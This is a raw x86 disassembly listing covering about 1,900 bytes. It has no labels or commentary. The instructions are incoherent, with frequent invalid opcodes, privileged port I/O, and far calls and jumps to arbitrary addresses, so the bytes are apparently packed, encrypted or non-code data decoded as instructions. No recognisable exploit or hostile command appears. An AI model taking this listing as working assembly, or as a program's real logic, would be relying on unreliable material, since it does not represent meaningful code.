  41d082:	cli    
  41d083:	jp     0x41d016
  41d085:	jg     0x41d046
  41d087:	mov    esi,0x5251c31d
  41d08c:	mov    ebx,0xde9a2fe7
  41d091:	fldcw  WORD PTR [edi-0x4b]
  41d094:	lahf   
  41d095:	div    BYTE PTR [esi+eax*1-0x25]
  41d099:	adc    DWORD PTR [esi+ecx*1-0x7e],ebx
  41d09d:	loopne 0x41d108
  41d09f:	lock pop ecx
  41d0a1:	mov    ch,cl
  41d0a3:	adc    eax,ebx
  41d0a5:	div    DWORD PTR [esp-0x5c]
  41d0a9:	out    0x17,al
  41d0ab:	push   ss
  41d0ac:	mov    eax,0x87b63791
  41d0b1:	in     eax,dx
  41d0b2:	adc    ch,BYTE PTR [esi+ebp*2-0x5e]
  41d0b6:	bound  ebp,QWORD PTR [edi+0x3f8dbc27]
  41d0bc:	cmp    eax,0xbea77608
  41d0c1:	call   0xa6d71e5e
  41d0c6:	std    
  41d0c7:	not    esi
  41d0c9:	pop    esi
  41d0ca:	sbb    al,ah
  41d0cc:	push   esp
  41d0cd:	inc    ecx
  41d0ce:	pop    ebp
  41d0cf:	and    al,0x52
  41d0d1:	xor    eax,0xa92f9997
  41d0d6:	arpl   WORD PTR [edx-0x3e653671],si
  41d0dc:	ins    BYTE PTR es:[edi],dx
  41d0dd:	lds    ebx,FWORD PTR [eax]
  41d0df:	jnp    0x41d09b
  41d0e1:	cs ins DWORD PTR es:[edi],dx
  41d0e3:	in     al,0x54
  41d0e5:	pop    edx
  41d0e6:	or     al,0x14
  41d0e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0e9:	mov    dl,ah
  41d0eb:	xchg   BYTE PTR [ebx+0x4c],cl
  41d0ee:	jle    0x41d150
  41d0f0:	adc    al,BYTE PTR ds:0x5cd83692
  41d0f6:	sbb    esp,edx
  41d0f8:	sub    cl,ch
  41d0fa:	mov    es,WORD PTR [esi]
  41d0fc:	pop    ss
  41d0fd:	sbb    ah,BYTE PTR [edx+0x17]
  41d100:	pop    ebp
  41d101:	sbb    eax,0xf4b0d5c0
  41d106:	sub    BYTE PTR ds:0x777f4be1,dh
  41d10c:	cmc    
  41d10d:	out    dx,eax
  41d10e:	lahf   
  41d10f:	cli    
  41d110:	xchg   ecx,eax
  41d111:	or     eax,0x96632434
  41d116:	dec    ecx
  41d117:	sar    BYTE PTR [ebx+0x21],1
  41d11a:	in     al,0x6d
  41d11c:	and    DWORD PTR [edi],edx
  41d11e:	cs call 0x1415:0x33c8293b
  41d126:	scas   al,BYTE PTR es:[edi]
  41d127:	outs   dx,BYTE PTR ds:[esi]
  41d128:	xchg   esp,eax
  41d129:	fbld   TBYTE PTR [esi+0xe]
  41d12c:	sub    DWORD PTR [eax+0x4b],edx
  41d12f:	retf   0xc761
  41d132:	xor    BYTE PTR [esi],al
  41d134:	rcl    BYTE PTR [ebx-0x17d94ccd],0xd6
  41d13b:	test   DWORD PTR [ecx+0xe13e29e],esp
  41d141:	jns    0x41d124
  41d143:	lock and dl,0x1b
  41d147:	mov    ds:0xcf5818ae,al
  41d14c:	fmul   st(7),st
  41d14e:	mov    esi,0xf34cefde
  41d153:	je     0x41d149
  41d155:	fld    DWORD PTR [ebp+esi*1-0x1a0d6e2d]
  41d15c:	mov    eax,ds:0xd024837e
  41d161:	jg     0x41d18c
  41d163:	sbb    dh,BYTE PTR [eax+0x1987cb64]
  41d169:	mov    al,0x6d
  41d16b:	push   0xb69fb80c
  41d170:	dec    edi
  41d171:	cs jge 0x41d12a
  41d174:	stos   BYTE PTR es:[edi],al
  41d175:	not    BYTE PTR [edi-0x3212b0d]
  41d17b:	enter  0x312d,0xfa
  41d17f:	not    DWORD PTR [edi-0x78]
  41d182:	xor    al,0xc3
  41d184:	outs   dx,BYTE PTR ds:[esi]
  41d185:	jmp    0x2693:0xe59ff407
  41d18c:	nop
  41d18d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d18e:	fnsave [ecx+0x261ae8e3]
  41d194:	rcl    edi,1
  41d196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d197:	and    ch,al
  41d199:	in     al,dx
  41d19a:	push   edx
  41d19b:	ret    0x5082
  41d19e:	shl    BYTE PTR [eax+0xf211a83],0x71
  41d1a5:	adc    cl,ah
  41d1a7:	mov    ah,0x3e
  41d1a9:	inc    esp
  41d1aa:	aad    0xc5
  41d1ac:	out    dx,eax
  41d1ad:	cmp    eax,0x9967661d
  41d1b2:	pop    esi
  41d1b3:	dec    esi
  41d1b4:	imul   esp,DWORD PTR [eax],0xffffffd8
  41d1b7:	mov    es,WORD PTR [eax+0x43101119]
  41d1bd:	jo     0x41d161
  41d1bf:	sub    ebp,0xd463b69b
  41d1c5:	push   ss
  41d1c6:	mov    cl,BYTE PTR [esi+0x69b50072]
  41d1cc:	pop    es
  41d1cd:	xchg   edx,eax
  41d1ce:	daa    
  41d1cf:	dec    eax
  41d1d0:	xchg   ebp,eax
  41d1d1:	jge    0x41d19f
  41d1d3:	push   0x3ae45179
  41d1d8:	push   0x2b
  41d1da:	cmp    DWORD PTR [eax+ecx*4-0x579064ef],edi
  41d1e1:	lea    esi,[esi-0x5d62a71d]
  41d1e7:	(bad)  
  41d1e8:	dec    DWORD PTR [eax-0x3babf6f7]
  41d1ee:	jecxz  0x41d223
  41d1f0:	mov    ds:0xda6a01c6,al
  41d1f5:	ja     0x41d269
  41d1f7:	scas   al,BYTE PTR es:[edi]
  41d1f8:	fs aam 0x68
  41d1fb:	sbb    DWORD PTR [eax],edi
  41d1fd:	cmp    eax,0x82d5d78
  41d202:	fs mov bl,0x4d
  41d205:	xchg   esi,eax
  41d206:	mov    ds:0x8e7acedc,al
  41d20b:	(bad)  
  41d20c:	jmp    0x23430f4d
  41d211:	xchg   ebx,eax
  41d212:	cld    
  41d213:	imul   al
  41d215:	cmp    BYTE PTR [edx-0x671fd0ec],bh
  41d21b:	es mov edx,0x2cdc8e57
  41d221:	cmp    al,0x3a
  41d223:	shl    dl,0x66
  41d226:	arpl   WORD PTR [eax-0x560a1929],bp
  41d22c:	sbb    BYTE PTR [edi-0x65],al
  41d22f:	jecxz  0x41d286
  41d231:	icebp  
  41d232:	or     ebx,DWORD PTR [edi-0x53b4e94c]
  41d238:	xchg   BYTE PTR [ebx],bl
  41d23a:	pusha  
  41d23b:	push   esp
  41d23c:	shl    BYTE PTR [eax+0x64],0xf4
  41d240:	call   0x23db:0xfa287eb3
  41d247:	jo     0x41d234
  41d249:	test   al,0xfc
  41d24b:	mov    edi,0xa14ee295
  41d250:	cmp    DWORD PTR [edx-0x50],esp
  41d253:	rcl    BYTE PTR [ecx],1
  41d255:	dec    esp
  41d256:	je     0x41d1e1
  41d258:	jecxz  0x41d2ca
  41d25a:	test   DWORD PTR es:[edx],ebx
  41d25d:	xchg   ecx,eax
  41d25e:	es inc eax
  41d260:	int3   
  41d261:	jg     0x41d26f
  41d263:	add    bl,bl
  41d265:	cmp    bl,cl
  41d267:	and    al,0x32
  41d269:	out    0x65,al
  41d26b:	shl    BYTE PTR [ecx+0x8],1
  41d26e:	fcom   DWORD PTR [ebx-0x5fb9f6b6]
  41d274:	ret    0xbb87
  41d277:	dec    ebp
  41d278:	sbb    edi,DWORD PTR [edx]
  41d27a:	in     eax,0xf1
  41d27c:	scas   al,BYTE PTR es:[edi]
  41d27d:	cmp    al,0x45
  41d27f:	cmp    ecx,DWORD PTR [ebp+0x725f339a]
  41d285:	push   ecx
  41d286:	fs int3 
  41d288:	clc    
  41d289:	jb     0x41d2f0
  41d28b:	ror    DWORD PTR [eax],1
  41d28d:	jmp    0xc6405889
  41d292:	bound  esi,QWORD PTR [ecx]
  41d294:	add    dh,BYTE PTR [ebx]
  41d296:	aas    
  41d297:	mov    dh,BYTE PTR [ebx+ebx*2]
  41d29a:	fbstp  TBYTE PTR [ebx+eax*2]
  41d29d:	cmp    BYTE PTR ds:0x5b59f930,ch
  41d2a3:	sti    
  41d2a4:	sub    al,0xca
  41d2a6:	jae    0x41d236
  41d2a8:	push   0x97fec861
  41d2ad:	mov    ds:0x3eb6a6a4,al
  41d2b2:	add    ch,dl
  41d2b4:	nop
  41d2b5:	sbb    BYTE PTR [eax+0x46],0x80
  41d2b9:	ins    DWORD PTR es:[edi],dx
  41d2ba:	mov    dl,0xbe
  41d2bc:	ret    0xc79b
  41d2bf:	ror    BYTE PTR [edi],0x67
  41d2c2:	(bad)
  41d2c5:	jge    0x41d33c
  41d2c7:	les    eax,FWORD PTR [esi+0x6d]
  41d2ca:	cs scas eax,DWORD PTR es:[edi]
  41d2cc:	add    edx,0xffffffaf
  41d2cf:	fsub   st(2),st
  41d2d1:	mov    eax,ds:0x21d4ed4c
  41d2d6:	stos   DWORD PTR es:[edi],eax
  41d2d7:	jmp    0x41d292
  41d2d9:	out    dx,eax
  41d2da:	mov    fs,WORD PTR [edi+0x1e]
  41d2dd:	retf   0x332e
  41d2e0:	xor    dl,dl
  41d2e2:	jno    0x41d285
  41d2e4:	call   0xf12194ad
  41d2e9:	pop    ss
  41d2ea:	dec    ebx
  41d2eb:	cmp    eax,DWORD PTR [ecx+eax*1]
  41d2ee:	sbb    ah,ch
  41d2f0:	cmp    bh,dh
  41d2f2:	rcr    BYTE PTR [edx+edx*4-0x5a],1
  41d2f6:	inc    ebp
  41d2f7:	pop    es
  41d2f8:	inc    edx
  41d2f9:	aad    0x58
  41d2fb:	or     al,0x83
  41d2fd:	sbb    bl,BYTE PTR [eax-0x41]
  41d300:	sbb    DWORD PTR [ecx],ebp
  41d302:	and    DWORD PTR [edx+0x7d],0x28
  41d306:	or     esp,0x3bcf50be
  41d30c:	jns    0x41d313
  41d30e:	mov    ebp,0x8ca5a729
  41d313:	sbb    al,0xf0
  41d315:	sbb    bh,BYTE PTR [ebp-0x75]
  41d318:	xor    eax,0x6eb3bd3c
  41d31d:	xchg   ebp,eax
  41d31e:	ror    DWORD PTR [esi],1
  41d320:	xor    DWORD PTR [ebx+0x3a],ebx
  41d323:	fmul   st,st(6)
  41d325:	inc    esp
  41d326:	or     al,0xbd
  41d328:	neg    DWORD PTR ds:0x2bd2c98e
  41d32e:	(bad)  
  41d32f:	lock or BYTE PTR ds:0xd7970009,ah
  41d336:	in     eax,0x6
  41d338:	addr16 mov eax,ds:0x6f02
  41d33c:	ss mov dl,0x69
  41d33f:	iret   
  41d340:	imul   BYTE PTR [ecx]
  41d342:	adc    bh,ch
  41d344:	in     eax,dx
  41d345:	mov    edx,0xf434a57a
  41d34a:	jp     0x41d333
  41d34c:	out    0x3c,al
  41d34e:	jb     0x41d351
  41d350:	jmp    DWORD PTR [eax-0x1e]
  41d353:	mov    ecx,0xf244165c
  41d358:	pop    edi
  41d359:	lea    ebx,ds:0x3337f294
  41d35f:	data16 jns 0x41d37f
  41d362:	xor    eax,0x86063ed9
  41d367:	cmc    
  41d368:	popa   
  41d369:	sti    
  41d36a:	cmp    BYTE PTR [ebp+0x73e793c9],bh
  41d370:	push   ebp
  41d371:	mov    ecx,0xffca143e
  41d376:	add    ecx,DWORD PTR [ebx+ecx*1]
  41d379:	(bad)  
  41d37a:	in     eax,0x30
  41d37c:	addr16 pop ebp
  41d37e:	add    BYTE PTR [edx+0x7665f10],0xc3
  41d385:	std    
  41d386:	call   0xec46:0xff5892eb
  41d38d:	out    0x56,al
  41d38f:	cmp    eax,esp
  41d391:	jno    0x41d3ae
  41d393:	repz push eax
  41d395:	scas   al,BYTE PTR es:[edi]
  41d396:	jo     0x41d351
  41d398:	test   BYTE PTR [esi+0x5b],ah
  41d39b:	pop    es
  41d39c:	fwait
  41d39d:	mov    edx,0x9d5b5c60
  41d3a2:	adc    BYTE PTR [edx-0x7c3081f3],al
  41d3a8:	mov    ds:0x5b45ae3,eax
  41d3ad:	push   0x5379f84e
  41d3b2:	pop    ds
  41d3b3:	sub    DWORD PTR [eax-0x1f71e9b9],eax
  41d3b9:	aam    0xc2
  41d3bb:	clc    
  41d3bc:	push   0x35
  41d3be:	dec    edx
  41d3bf:	cli    
  41d3c0:	pop    ebx
  41d3c1:	cli    
  41d3c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3c3:	pusha  
  41d3c4:	sub    DWORD PTR [ecx],esi
  41d3c6:	push   ss
  41d3c7:	into   
  41d3c8:	mov    esp,0x50846c4e
  41d3cd:	xchg   ebx,eax
  41d3ce:	into   
  41d3cf:	pop    ebx
  41d3d1:	push   ds
  41d3d2:	test   BYTE PTR [edi+0x30ff7949],0x2a
  41d3d9:	sbb    eax,0x297fcde0
  41d3de:	jne    0x41d3ce
  41d3e0:	dec    ebx
  41d3e1:	xchg   edx,eax
  41d3e2:	(bad)
  41d3e5:	jl     0x41d399
  41d3e7:	mov    eax,0xcef1ed6c
  41d3ec:	jle    0x41d400
  41d3ee:	dec    edi
  41d3ef:	inc    edx
  41d3f0:	and    DWORD PTR [ebx+0xa],edi
  41d3f3:	or     DWORD PTR [eax],edi
  41d3f5:	inc    edi
  41d3f6:	mov    edi,0x2a931b0f
  41d3fb:	lahf   
  41d3fc:	adc    BYTE PTR [edx+ecx*1],al
  41d3ff:	pop    eax
  41d400:	pop    eax
  41d401:	mov    esi,0x187316e5
  41d406:	popf   
  41d407:	stc    
  41d408:	inc    esp
  41d409:	pop    eax
  41d40a:	xchg   DWORD PTR [edx-0x23],esi
  41d40d:	xor    eax,0xb9d6cd84
  41d412:	rcr    DWORD PTR [ecx-0x72667ce5],1
  41d418:	and    edi,DWORD PTR [ecx]
  41d41a:	sbb    eax,0x85826b6a
  41d420:	cmp    BYTE PTR [ecx],ah
  41d422:	inc    ebx
  41d423:	inc    edi
  41d424:	out    0x5f,al
  41d426:	enter  0x19d,0x39
  41d42a:	ss (bad) 
  41d42c:	nop
  41d42d:	cli    
  41d42e:	fimul  DWORD PTR [ebp+0x45]
  41d431:	retf   0x54b1
  41d434:	mov    ch,0xe6
  41d436:	push   edx
  41d437:	adc    al,0xd8
  41d439:	(bad)  
  41d43a:	ror    bh,cl
  41d43c:	dec    esi
  41d43d:	adc    ecx,edx
  41d43f:	adc    al,0xd8
  41d441:	push   ss
  41d442:	pushf  
  41d443:	retf   0xf34c
  41d446:	adc    dh,al
  41d448:	and    ecx,DWORD PTR [ecx+edx*2]
  41d44b:	mov    bl,0xd1
  41d44d:	lds    edi,FWORD PTR [eax+0x77]
  41d450:	or     eax,0x1d827cec
  41d455:	jbe    0x41d3e3
  41d457:	mov    dh,0xef
  41d459:	pop    es
  41d45a:	(bad)  
  41d45b:	in     al,0xd5
  41d45d:	daa    
  41d45e:	xor    al,0x9d
  41d460:	aam    0x2d
  41d462:	xchg   DWORD PTR [edx],ebx
  41d464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d465:	aas    
  41d466:	sar    DWORD PTR fs:[edi+esi*8],0xb6
  41d46b:	sbb    DWORD PTR [eax+0x55],edx
  41d46e:	or     DWORD PTR [edx-0x6c2a3e97],0xfffffff4
  41d475:	popf   
  41d476:	pop    esp
  41d477:	popa   
  41d478:	xor    bh,bl
  41d47a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d47b:	mov    ebx,0xae5eb0db
  41d480:	jno    0x41d404
  41d482:	mov    bh,BYTE PTR [ebp+0x16794045]
  41d488:	xchg   ebx,eax
  41d489:	hlt    
  41d48a:	pop    ebp
  41d48b:	jg     0x41d4d5
  41d48d:	mov    BYTE PTR [ebx],0x31
  41d490:	sub    eax,0x69d54571
  41d495:	xchg   ebx,eax
  41d496:	int    0x5e
  41d498:	pop    es
  41d499:	mov    ss,WORD PTR [ebp+ebp*8-0x3649ea5d]
  41d4a0:	fild   DWORD PTR [ebx-0x1df770f5]
  41d4a6:	push   ds
  41d4a7:	sbb    eax,0x51bb12f0
  41d4ac:	mov    eax,ds:0x4c94625c
  41d4b1:	jmp    0x169eaa41
  41d4b6:	mov    ebx,0x6f048f79
  41d4bb:	mov    ebp,0xd1be47b0
  41d4c0:	jnp    0x41d49d
  41d4c2:	mov    al,ds:0x76a5a937
  41d4c7:	retf   0x25b9
  41d4ca:	mov    ch,0xee
  41d4cc:	popa   
  41d4cd:	mov    ebp,0x4234f300
  41d4d2:	add    ecx,DWORD PTR [esi-0x14]
  41d4d5:	sub    edi,DWORD PTR [edx+0x3f]
  41d4d8:	adc    BYTE PTR [edx+0xb62389],al
  41d4de:	cmc    
  41d4df:	fidiv  DWORD PTR [esi-0x4d]
  41d4e2:	xor    BYTE PTR [eax],dh
  41d4e4:	inc    eax
  41d4e5:	ret    0xfeb8
  41d4e8:	out    dx,al
  41d4e9:	fild   QWORD PTR ds:0x17994b47
  41d4ef:	jmp    FWORD PTR [esi+0x6a]
  41d4f2:	mov    al,0xea
  41d4f4:	scas   al,BYTE PTR es:[edi]
  41d4f5:	inc    edx
  41d4f6:	ret    0x94a
  41d4f9:	mov    edx,0x338a7b91
  41d4fe:	arpl   WORD PTR [edi-0x2c],cx
  41d501:	ss pop es
  41d503:	mov    ah,0x54
  41d505:	fild   WORD PTR [esi+0x73]
  41d508:	jp     0x41d561
  41d50a:	dec    esp
  41d50b:	add    DWORD PTR [eax],esp
  41d50d:	xchg   edi,eax
  41d50e:	push   ss
  41d50f:	sbb    ah,BYTE PTR [ebp+0x30]
  41d512:	mov    ecx,0x7cbcb6a3
  41d517:	push   0xffffffa8
  41d519:	std    
  41d51a:	hlt    
  41d51b:	or     ebx,edx
  41d51d:	loop   0x41d59c
  41d51f:	jbe    0x41d4dd
  41d521:	xchg   ecx,eax
  41d522:	or     esi,DWORD PTR [edi-0x2a3e038b]
  41d528:	call   0x326b:0x2cfb0449
  41d52f:	sti    
  41d530:	stc    
  41d531:	pop    eax
  41d532:	stc    
  41d533:	push   cs
  41d534:	inc    esi
  41d535:	jns    0x41d559
  41d537:	sbb    BYTE PTR [edi],ch
  41d539:	sub    ah,BYTE PTR [eax]
  41d53b:	imul   BYTE PTR [ecx-0x7922256b]
  41d541:	jecxz  0x41d5b2
  41d543:	or     edx,DWORD PTR [ebx+0x24c33437]
  41d549:	cmp    bl,BYTE PTR [eax+0xd0cb4cd]
  41d54f:	mov    DWORD PTR [edi],eax
  41d551:	(bad)  
  41d552:	push   0xeb242381
  41d557:	in     eax,0x10
  41d559:	sub    eax,DWORD PTR [ebp+0x5a]
  41d55c:	and    edx,DWORD PTR [edx-0x3db2dae5]
  41d562:	aaa    
  41d563:	and    dl,bl
  41d565:	(bad)  
  41d566:	mov    ebp,0xd3238bb5
  41d56b:	xlat   BYTE PTR ds:[ebx]
  41d56c:	sbb    BYTE PTR [eax*2-0x71c0448e],bl
  41d573:	mov    al,0xf1
  41d575:	inc    ecx
  41d576:	adc    cl,BYTE PTR [edi+esi*2+0x7e]
  41d57a:	lock dec ebp
  41d57c:	push   cs
  41d57d:	(bad)  
  41d57e:	fcomp  DWORD PTR [ebx-0x7c]
  41d581:	adc    DWORD PTR [eax+0x2e91fc2],esi
  41d587:	imul   ecx,DWORD PTR [ecx+0x522a13a4],0x24
  41d58e:	xchg   ebp,eax
  41d58f:	std    
  41d590:	ror    DWORD PTR [edi],0x15
  41d593:	ret    0xc822
  41d596:	sbb    BYTE PTR [eax],ch
  41d598:	lock pushf 
  41d59a:	cmp    DWORD PTR [esi+0x63ff28c1],edx
  41d5a0:	push   esi
  41d5a1:	(bad)  
  41d5a2:	mov    bl,BYTE PTR [eax-0x76]
  41d5a5:	cmp    BYTE PTR [esi-0x69],al
  41d5a8:	inc    eax
  41d5a9:	bound  ebp,QWORD PTR [ebp-0x32]
  41d5ac:	sub    DWORD PTR [ebp+0x70],esi
  41d5af:	jns    0x41d5fe
  41d5b1:	cmc    
  41d5b2:	inc    esp
  41d5b3:	inc    edi
  41d5b5:	mov    al,0xf2
  41d5b7:	call   0x94bb5e98
  41d5bc:	mov    eax,0xfac3af9b
  41d5c1:	cmp    ebx,DWORD PTR [ebx]
  41d5c3:	sub    al,0x29
  41d5c5:	xlat   BYTE PTR ds:[ebx]
  41d5c6:	mov    al,ds:0xe6681994
  41d5cb:	xchg   ebx,eax
  41d5cc:	idiv   DWORD PTR [ebx-0x52]
  41d5cf:	pop    esi
  41d5d0:	in     eax,dx
  41d5d1:	mov    eax,0xab1384b7
  41d5d6:	pop    edi
  41d5d7:	ror    BYTE PTR [edi+0x18],0x1f
  41d5db:	pop    ds
  41d5dc:	lahf   
  41d5dd:	add    ecx,DWORD PTR [ebp+0xf]
  41d5e0:	pop    esi
  41d5e1:	push   ebx
  41d5e2:	jnp    0x41d5eb
  41d5e4:	push   0xffffff8a
  41d5e6:	icebp  
  41d5e7:	dec    ebx
  41d5e8:	adc    dh,BYTE PTR [ebp-0x36]
  41d5eb:	test   BYTE PTR [eax-0xb],dh
  41d5ee:	inc    ebp
  41d5ef:	ret    
  41d5f0:	sub    eax,0x7eaad00e
  41d5f5:	inc    ebx
  41d5f6:	cmp    al,0x80
  41d5f9:	push   ebp
  41d5fa:	cli    
  41d5fb:	or     al,0x24
  41d5fd:	push   es
  41d5fe:	mov    al,0x47
  41d600:	out    0x6e,al
  41d602:	sub    bl,ch
  41d604:	xor    eax,0xb19d3084
  41d609:	jmp    0x41d5b5
  41d60b:	imul   edi,DWORD PTR [edi],0x283659f1
  41d611:	inc    edi
  41d612:	leave  
  41d613:	ins    DWORD PTR es:[edi],dx
  41d614:	pop    edx
  41d615:	jg     0x41d59b
  41d617:	pop    esi
  41d618:	cmp    BYTE PTR ds:0x9cb2d20b,ch
  41d61e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d61f:	into   
  41d620:	imul   ecx,esp,0xffffffea
  41d623:	fwait
  41d624:	sbb    DWORD PTR [bp+0x474c],esi
  41d629:	xchg   edi,eax
  41d62a:	sub    al,0x8
  41d62c:	sahf   
  41d62d:	dec    edx
  41d62e:	xchg   ebp,eax
  41d62f:	push   ss
  41d630:	push   ebx
  41d631:	out    0xa7,eax
  41d633:	sub    al,0x1f
  41d635:	push   edi
  41d636:	out    dx,al
  41d637:	xchg   ebp,eax
  41d638:	rcr    DWORD PTR [ecx+0x33],1
  41d63b:	les    esp,FWORD PTR [esi]
  41d63d:	jo     0x41d64b
  41d63f:	mov    ebx,0x9d8e2d4f
  41d644:	sbb    eax,0xb902fcc9
  41d649:	fsub   QWORD PTR [ebp-0x28]
  41d64c:	mul    ch
  41d64e:	dec    esi
  41d64f:	inc    eax
  41d650:	cmp    eax,0x6b72aae6
  41d655:	retf   
  41d656:	test   al,0x5e
  41d658:	pop    esi
  41d659:	pushf  
  41d65a:	push   es
  41d65b:	(bad)  
  41d65c:	(bad)  
  41d65d:	dec    eax
  41d65e:	stc    
  41d65f:	pop    ss
  41d660:	popa   
  41d661:	mov    BYTE PTR [ecx],ah
  41d663:	mov    bh,0xa5
  41d665:	xchg   DWORD PTR [ebx],edi
  41d667:	outs   dx,BYTE PTR ds:[esi]
  41d668:	int    0x37
  41d66a:	jo     0x41d632
  41d66c:	lds    esp,FWORD PTR [ecx+0x42]
  41d66f:	popa   
  41d670:	out    0xdd,eax
  41d672:	mov    ds:0x7ab78ed6,eax
  41d677:	(bad)
  41d67a:	mov    edi,0x1a93d92c
  41d67f:	dec    eax
  41d680:	std    
  41d681:	or     al,0x70
  41d683:	pop    ecx
  41d684:	fisubr DWORD PTR [eax]
  41d686:	fcmovnbe st,st(2)
  41d688:	mov    bh,0x96
  41d68a:	cli    
  41d68b:	fistp  WORD PTR [edx+0x8]
  41d68e:	inc    edi
  41d68f:	sbb    al,0x10
  41d691:	add    BYTE PTR [ecx-0x7e7093c3],cl
  41d697:	mov    dl,0xcf
  41d699:	cmp    DWORD PTR [ecx-0x41697a11],eax
  41d69f:	add    BYTE PTR [edi],dl
  41d6a1:	dec    ebp
  41d6a2:	dec    ebp
  41d6a3:	mov    ebx,edi
  41d6a5:	ss mov esi,0xfefa1cc4
  41d6ab:	sbb    BYTE PTR [ecx+edi*2-0x3d],al
  41d6af:	sti    
  41d6b0:	mov    bl,0x4b
  41d6b2:	jnp    0x41d705
  41d6b4:	sti    
  41d6b5:	out    0x11,al
  41d6b7:	stos   BYTE PTR es:[edi],al
  41d6b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6b9:	inc    BYTE PTR [eax+0x2be422b7]
  41d6bf:	(bad)  
  41d6c1:	inc    edi
  41d6c2:	pop    esp
  41d6c3:	push   cs
  41d6c4:	jp     0x41d6ae
  41d6c6:	push   es
  41d6c7:	cld    
  41d6c8:	cmp    ah,BYTE PTR [ecx+0x1e]
  41d6cb:	push   eax
  41d6cc:	add    eax,0x9c272aac
  41d6d1:	cdq    
  41d6d2:	scas   eax,DWORD PTR es:[edi]
  41d6d3:	push   cs
  41d6d4:	pop    eax
  41d6d5:	jmp    0xd810:0xf7736a5e
  41d6dc:	mov    dh,0x1b
  41d6de:	loopne 0x41d675
  41d6e0:	jbe    0x41d678
  41d6e2:	leave  
  41d6e3:	inc    ebp
  41d6e4:	push   0x91738a7
  41d6e9:	je     0x41d72c
  41d6eb:	rcl    BYTE PTR [edx],0x94
  41d6ee:	xor    bh,bh
  41d6f0:	jo     0x41d74e
  41d6f2:	adc    al,0x68
  41d6f4:	aam    0xad
  41d6f6:	(bad)  
  41d6f7:	mov    edx,0xd6cfa88f
  41d6fc:	fld    DWORD PTR [esi+0x7f]
  41d6ff:	push   eax
  41d700:	js     0x41d75b
  41d702:	inc    esi
  41d703:	pop    ebp
  41d704:	(bad)  
  41d705:	mov    ch,0x1d
  41d707:	enter  0x7655,0x19
  41d70b:	cmc    
  41d70c:	shr    ebp,0xc9
  41d70f:	jmp    0x41d6e9
  41d711:	push   ds
  41d712:	popa   
  41d713:	mov    ecx,0xd9ab8bc9
  41d718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d719:	lods   eax,DWORD PTR ds:[esi]
  41d71a:	stos   DWORD PTR es:[edi],eax
  41d71b:	arpl   WORD PTR [ecx+0x4c],sp
  41d71e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d71f:	(bad)  
  41d720:	dec    esp
  41d721:	dec    edi
  41d722:	mov    esp,0xe63df902
  41d727:	daa    
  41d728:	jae    0x41d773
  41d72a:	cmp    al,0x6a
  41d72c:	and    BYTE PTR [ebx-0x6bbec8a],0xe8
  41d733:	loopne 0x41d74a
  41d735:	addr16 test al,0xf4
  41d738:	test   BYTE PTR [edi-0x72a87c07],bh
  41d73e:	xor    BYTE PTR [eax],dh
  41d740:	xor    ah,al
  41d742:	inc    ecx
  41d743:	hlt    
  41d744:	pop    eax
  41d745:	bound  ebp,QWORD PTR ds:0x6f6de22f
  41d74b:	fiadd  WORD PTR [ebx+0x5ff01b03]
  41d751:	in     eax,dx
  41d752:	sbb    dl,BYTE PTR [ecx-0x532fa3cd]
  41d758:	scas   al,BYTE PTR es:[edi]
  41d759:	push   cs
  41d75a:	xchg   BYTE PTR [ebp-0x6985a963],al
  41d760:	cld    
  41d761:	(bad)
  41d764:	dec    edx
  41d765:	cmp    edx,edx
  41d767:	(bad)  
  41d769:	adc    DWORD PTR [esi+eiz*8],esi
  41d76c:	xor    ebx,DWORD PTR [esi-0x37fe467c]
  41d772:	jmp    0x5ec0d443
  41d777:	cmp    ecx,DWORD PTR [ecx]
  41d779:	in     al,0x9a
  41d77b:	outs   dx,DWORD PTR ds:[esi]
  41d77c:	fnstsw WORD PTR [ebx+0x6c]
  41d77f:	leave  
  41d780:	mov    ch,0xe7
  41d782:	cmp    ebp,DWORD PTR [edx+ebx*2+0x4b37f753]
  41d789:	(bad)  
  41d78a:	jbe    0x41d7a0
  41d78c:	sbb    eax,0xddccf3c1
  41d791:	shl    ebp,cl
  41d793:	icebp  
  41d794:	cmc    
  41d795:	shr    DWORD PTR [edi+0x3d],1
  41d798:	xor    al,0x59
  41d79a:	cdq    
  41d79b:	mov    ah,0x8f
  41d79d:	aad    0x1
  41d79f:	lea    ebp,[ecx+0x1e]
  41d7a2:	jne    0x41d7e7
  41d7a4:	and    BYTE PTR [edx+ebp*2+0x27a0cb81],dl
  41d7ab:	inc    edx
  41d7ac:	cmp    al,0x68
  41d7ae:	ds dec esp
  41d7b0:	pop    ebp
  41d7b1:	jns    0x41d751
  41d7b3:	(bad)  
  41d7b4:	push   eax
  41d7b5:	jmp    0x41d739
  41d7b7:	sbb    eax,0xb1397a01
  41d7bc:	xchg   al,ah
  41d7be:	dec    edi
  41d7bf:	xchg   ebp,eax
  41d7c0:	(bad)
  41d7c3:	cmp    eax,DWORD PTR [ecx]
  41d7c5:	cmp    al,0x57
  41d7c7:	das    
  41d7c8:	add    BYTE PTR [ecx+0x647cbb8d],bh
  41d7ce:	out    0x53,eax
  41d7d0:	jbe    0x41d7cc
  41d7d2:	sahf   
  41d7d3:	jbe    0x41d75d
  41d7d5:	out    dx,al
  41d7d6:	pop    ecx
  41d7d7:	mov    ch,BYTE PTR [ebx+0xe]
  41d7da:	test   dl,dh
  41d7dc:	fild   QWORD PTR [ebp-0x624e6211]
  41d7e2:	mov    dh,0x2f
  41d7e4:	cli    
  41d7e5:	call   0x856a:0x2849fce
  41d7ec:	and    al,0x45
  41d7ee:	fidivr DWORD PTR [edx+0x25]
  41d7f1:	clc    
  41d7f2:	call   0x3b04:0xf54c9809
  41d7f9:	js     0x41d7b3
  41d7fb:	adc    edx,esp
  41d7fd:	arpl   WORD PTR [ecx],sp
  41d7ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d800:	sub    al,0x71
  41d802:	in     eax,dx
  41d803:	dec    ebx
  41d804:	shl    esi,cl
  41d806:	(bad)  
  41d807:	jno    0x41d85e
  41d809:	and    DWORD PTR [edx],0x320fa362
